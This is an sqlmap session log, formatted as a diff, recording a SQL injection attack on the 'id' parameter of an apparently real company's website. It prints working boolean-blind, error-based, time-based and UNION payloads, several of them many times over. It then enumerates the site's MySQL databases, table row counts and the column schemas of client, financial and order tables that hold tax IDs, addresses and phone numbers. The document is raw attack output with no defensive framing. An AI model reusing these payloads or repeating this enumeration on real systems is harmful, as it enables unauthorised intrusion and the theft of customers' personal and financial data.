@@ -1,0 +1,1230 @@
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] digitalprodutor1
+[*] digitalprodutora
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] digitalprodutor1
+[*] digitalprodutora
+[*] information_schema
+
+Database: digitalprodutor1
+[36 tables]
++---------------------------------------+
+| acesso                                |
+| acesso_menu                           |
+| backup                                |
+| banco                                 |
+| banco2                                |
+| banco_forma                           |
+| banco_link                            |
+| cliente                               |
+| config                                |
+| contato                               |
+| events                                |
+| events_datas                          |
+| financeiro                            |
+| financeiro_banco                      |
+| financeiro_banco_itens                |
+| financeiro_fornecedor                 |
+| financeiro_link                       |
+| financeiro_tipo                       |
+| funil                                 |
+| funil_acao                            |
+| funil_etapa                           |
+| funil_historico                       |
+| funil_status                          |
+| grupo                                 |
+| grupo_link                            |
+| item                                  |
+| item_orc                              |
+| orcamento                             |
+| orcamento_desc                        |
+| orcamento_desc_item                   |
+| ordem                                 |
+| tipo                                  |
+| uf_cidade                             |
+| uf_estado                             |
+| usuario                               |
+| usuario_tipo                          |
++---------------------------------------+
+
+Database: digitalprodutora
+[14 tables]
++---------------------------------------+
+| administrador                         |
+| agencias                              |
+| agriopreto                            |
+| antigos                               |
+| contato                               |
+| mailing                               |
+| mailing_email                         |
+| mailing_empresa                       |
+| mailing_mail                          |
+| mailing_unico                         |
+| videos                                |
+| videos_categoria                      |
+| visita_index                          |
+| visita_page                           |
++---------------------------------------+
+
+Database: information_schema
+[72 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_TEMPORARY_TABLES               |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TEMPORARY_TABLES                      |
+| THREAD_STATISTICS                     |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
+| XTRADB_ZIP_DICT                       |
+| XTRADB_ZIP_DICT_COLS                  |
++---------------------------------------+
+
+Database: digitalprodutor1
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| financeiro                            | 7508    |
+| banco_link                            | 7497    |
+| banco                                 | 7483    |
+| uf_cidade                             | 5564    |
+| item_orc                              | 5239    |
+| orcamento_desc_item                   | 5123    |
+| orcamento                             | 5116    |
+| ordem                                 | 2841    |
+| cliente                               | 1829    |
+| financeiro_link                       | 140     |
+| financeiro_fornecedor                 | 126     |
+| banco_forma                           | 105     |
+| events                                | 86      |
+| funil_historico                       | 79      |
+| events_datas                          | 33      |
+| uf_estado                             | 27      |
+| financeiro_tipo                       | 24      |
+| grupo_link                            | 23      |
+| contato                               | 21      |
+| item                                  | 21      |
+| acesso                                | 18      |
+| financeiro_banco_itens                | 13      |
+| funil                                 | 13      |
+| grupo                                 | 12      |
+| funil_etapa                           | 8       |
+| funil_acao                            | 7       |
+| acesso_menu                           | 6       |
+| funil_status                          | 5       |
+| tipo                                  | 5       |
+| usuario                               | 4       |
+| financeiro_banco                      | 3       |
+| orcamento_desc                        | 3       |
+| usuario_tipo                          | 3       |
+| config                                | 2       |
++---------------------------------------+---------+
+
+Database: digitalprodutora
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| visita_index                          | 2973    |
+| mailing                               | 1337    |
+| agencias                              | 1129    |
+| mailing_unico                         | 801     |
+| agriopreto                            | 538     |
+| mailing_email                         | 493     |
+| visita_page                           | 447     |
+| mailing_empresa                       | 287     |
+| videos                                | 79      |
+| antigos                               | 70      |
+| videos_categoria                      | 12      |
+| contato                               | 11      |
+| mailing_mail                          | 9       |
+| administrador                         | 1       |
++---------------------------------------+---------+
+
+Database: information_schema
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| COLUMNS                               | 1049    |
+| SESSION_VARIABLES                     | 523     |
+| GLOBAL_VARIABLES                      | 508     |
+| GLOBAL_STATUS                         | 413     |
+| SESSION_STATUS                        | 413     |
+| COLLATION_CHARACTER_SET_APPLICABILITY | 219     |
+| COLLATIONS                            | 219     |
+| PARTITIONS                            | 122     |
+| TABLES                                | 122     |
+| STATISTICS                            | 53      |
+| KEY_COLUMN_USAGE                      | 50      |
+| TABLE_CONSTRAINTS                     | 50      |
+| PLUGINS                               | 48      |
+| CHARACTER_SETS                        | 40      |
+| INNODB_FT_DEFAULT_STOPWORD            | 36      |
+| SCHEMA_PRIVILEGES                     | 36      |
+| ENGINES                               | 9       |
+| SCHEMATA                              | 3       |
+| PROCESSLIST                           | 2       |
+| USER_PRIVILEGES                       | 1       |
++---------------------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: financeiro
+[15 columns]
++--------------------------+--------------+
+| Column                   | Type         |
++--------------------------+--------------+
+| finan_conta              | tinyint(11)  |
+| finan_entrada            | date         |
+| finan_link               | tinyint(4)   |
+| finan_movimento          | int(2)       |
+| finan_obs                | mediumtext   |
+| finan_pagamento          | date         |
+| finan_status             | int(1)       |
+| finan_valor              | decimal(8,2) |
+| finan_vencimento         | date         |
+| id_financeiro            | int(15)      |
+| id_financeiro_banco      | int(15)      |
+| id_financeiro_forma      | int(15)      |
+| id_financeiro_fornecedor | int(15)      |
+| id_financeiro_tipo       | int(15)      |
+| id_ordem                 | int(15)      |
++--------------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: orcamento
+[12 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| data       | date         |
+| entrega    | date         |
+| estado     | varchar(30)  |
+| id         | int(15)      |
+| id_agencia | int(15)      |
+| id_cliente | int(15)      |
+| pagamento  | varchar(250) |
+| tempo      | time         |
+| tipo       | varchar(150) |
+| usuario    | int(4)       |
+| validade   | date         |
+| valortotal | decimal(8,2) |
++------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: ordem
+[22 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| bairro          | varchar(250) |
+| cep             | varchar(15)  |
+| cidade          | varchar(250) |
+| cms             | char(2)      |
+| cnpj            | varchar(25)  |
+| dadosfatura     | int(1)       |
+| dataentrada     | date         |
+| endereco        | varchar(250) |
+| estado          | varchar(20)  |
+| id              | int(15)      |
+| id_orcamento    | int(15)      |
+| insc            | varchar(25)  |
+| nota            | char(2)      |
+| outros          | longtext     |
+| prazo           | varchar(150) |
+| razao           | varchar(250) |
+| recebido        | varchar(25)  |
+| taxaimposto     | int(11)      |
+| titulo          | varchar(250) |
+| uf              | varchar(4)   |
+| valor_comissao  | decimal(8,2) |
+| valor_comissao2 | varchar(250) |
++-----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: cliente
+[20 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| bairro      | varchar(150) |
+| celular     | varchar(15)  |
+| cep         | varchar(150) |
+| cidade      | varchar(150) |
+| cnpj_cpf    | varchar(150) |
+| complemento | varchar(150) |
+| datacli     | datetime     |
+| email       | varchar(150) |
+| estado      | varchar(15)  |
+| fax         | varchar(150) |
+| fone        | varchar(150) |
+| id          | int(15)      |
+| insc_rg     | varchar(150) |
+| logo        | varchar(250) |
+| nome        | varchar(250) |
+| numero      | int(15)      |
+| ramal       | int(15)      |
+| razao       | varchar(250) |
+| rua         | varchar(250) |
+| tipo        | varchar(50)  |
++-------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: cliente
+[20 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| bairro      | varchar(150) |
+| celular     | varchar(15)  |
+| cep         | varchar(150) |
+| cidade      | varchar(150) |
+| cnpj_cpf    | varchar(150) |
+| complemento | varchar(150) |
+| datacli     | datetime     |
+| email       | varchar(150) |
+| estado      | varchar(15)  |
+| fax         | varchar(150) |
+| fone        | varchar(150) |
+| id          | int(15)      |
+| insc_rg     | varchar(150) |
+| logo        | varchar(250) |
+| nome        | varchar(250) |
+| numero      | int(15)      |
+| ramal       | int(15)      |
+| razao       | varchar(250) |
+| rua         | varchar(250) |
+| tipo        | varchar(50)  |
++-------------+--------------+
+
+Database: digitalprodutor1
+Table: cliente
+[0 entries]
++--------+
+| bairro |
++--------+
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+[36 tables]
++------------------------+
+| acesso                 |
+| acesso_menu            |
+| backup                 |
+| banco                  |
+| banco2                 |
+| banco_forma            |
+| banco_link             |
+| cliente                |
+| config                 |
+| contato                |
+| events                 |
+| events_datas           |
+| financeiro             |
+| financeiro_banco       |
+| financeiro_banco_itens |
+| financeiro_fornecedor  |
+| financeiro_link        |
+| financeiro_tipo        |
+| funil                  |
+| funil_acao             |
+| funil_etapa            |
+| funil_historico        |
+| funil_status           |
+| grupo                  |
+| grupo_link             |
+| item                   |
+| item_orc               |
+| orcamento              |
+| orcamento_desc         |
+| orcamento_desc_item    |
+| ordem                  |
+| tipo                   |
+| uf_cidade              |
+| uf_estado              |
+| usuario                |
+| usuario_tipo           |
++------------------------+
+
+Database: digitalprodutor1
+Table: financeiro_banco
+[4 columns]
++-----------------------+--------------+
+| Column                | Type         |
++-----------------------+--------------+
+| financeiro_banco_id   | int(11)      |
+| financeiro_banco_nome | varchar(250) |
+| financeiro_banco_obs  | varchar(250) |
+| financeiro_banco_tipo | int(15)      |
++-----------------------+--------------+
+
+Database: digitalprodutor1
+Table: funil_historico
+[9 columns]
++--------------------------+------------+
+| Column                   | Type       |
++--------------------------+------------+
+| funil_historico_act      | int(11)    |
+| funil_historico_agenda   | datetime   |
+| funil_historico_calendar | tinyint(4) |
+| funil_historico_data     | datetime   |
+| funil_historico_id       | int(11)    |
+| funil_historico_txt      | mediumtext |
+| funil_historico_usuario  | int(11)    |
+| funil_historico_valor    | int(11)    |
+| funil_index_id           | int(11)    |
++--------------------------+------------+
+
+Database: digitalprodutor1
+Table: usuario_tipo
+[3 columns]
++--------------------+--------------+
+| Column             | Type         |
++--------------------+--------------+
+| usuario_tipo_icone | varchar(250) |
+| usuario_tipo_id    | int(11)      |
+| usuario_tipo_nome  | varchar(250) |
++--------------------+--------------+
+
+Database: digitalprodutor1
+Table: funil_etapa
+[3 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| funil_etapa_id    | int(11)      |
+| funil_etapa_index | int(11)      |
+| funil_etapa_nome  | varchar(250) |
++-------------------+--------------+
+
+Database: digitalprodutor1
+Table: financeiro_tipo
+[4 columns]
++----------------------------+--------------+
+| Column                     | Type         |
++----------------------------+--------------+
+| financeiro_tipo_classe     | int(15)      |
+| financeiro_tipo_fornecedor | int(11)      |
+| financeiro_tipo_id         | int(15)      |
+| financeiro_tipo_nome       | varchar(250) |
++----------------------------+--------------+
+
+Database: digitalprodutor1
+Table: item_orc
+[7 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| data         | date         |
+| id_agencia   | int(15)      |
+| id_cliente   | int(15)      |
+| id_item      | int(15)      |
+| id_orcamento | int(15)      |
+| item_orc_id  | int(11)      |
+| valor        | decimal(8,2) |
++--------------+--------------+
+
+Database: digitalprodutor1
+Table: financeiro
+[15 columns]
++--------------------------+--------------+
+| Column                   | Type         |
++--------------------------+--------------+
+| finan_conta              | tinyint(11)  |
+| finan_entrada            | date         |
+| finan_link               | tinyint(4)   |
+| finan_movimento          | int(2)       |
+| finan_obs                | mediumtext   |
+| finan_pagamento          | date         |
+| finan_status             | int(1)       |
+| finan_valor              | decimal(8,2) |
+| finan_vencimento         | date         |
+| id_financeiro            | int(15)      |
+| id_financeiro_banco      | int(15)      |
+| id_financeiro_forma      | int(15)      |
+| id_financeiro_fornecedor | int(15)      |
+| id_financeiro_tipo       | int(15)      |
+| id_ordem                 | int(15)      |
++--------------------------+--------------+
+
+Database: digitalprodutor1
+Table: financeiro_link
+[3 columns]
++----------------------------+---------+
+| Column                     | Type    |
++----------------------------+---------+
+| financeiro_link_fornecedor | int(15) |
+| financeiro_link_id         | int(15) |
+| financeiro_link_tipo       | int(15) |
++----------------------------+---------+
+
+Database: digitalprodutor1
+Table: banco
+[7 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| banco_data      | date         |
+| banco_desc      | varchar(250) |
+| banco_id        | int(11)      |
+| banco_info      | varchar(250) |
+| banco_lote      | varchar(7)   |
+| banco_movimento | int(11)      |
+| banco_valor     | decimal(8,2) |
++-----------------+--------------+
+
+Database: digitalprodutor1
+Table: grupo_link
+[3 columns]
++----------------+---------+
+| Column         | Type    |
++----------------+---------+
+| grupo_index_id | int(11) |
+| grupo_link_id  | int(11) |
+| grupo_tipo_id  | int(11) |
++----------------+---------+
+
+Database: digitalprodutor1
+Table: tipo
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(15)      |
+| tipo   | varchar(250) |
++--------+--------------+
+
+Database: digitalprodutor1
+Table: uf_cidade
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| estado | int(5)       |
+| id     | int(11)      |
+| nome   | varchar(120) |
++--------+--------------+
+
+Database: digitalprodutor1
+Table: orcamento_desc
+[4 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| desc_id     | int(11)      |
+| desc_label  | varchar(250) |
+| desc_status | int(2)       |
+| desc_txt    | longtext     |
++-------------+--------------+
+
+Database: digitalprodutor1
+Table: uf_estado
+[4 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| id     | int(11)     |
+| nome   | varchar(75) |
+| pais   | int(7)      |
+| uf     | varchar(5)  |
++--------+-------------+
+
+Database: digitalprodutor1
+Table: config
+[5 columns]
++---------------+--------------+
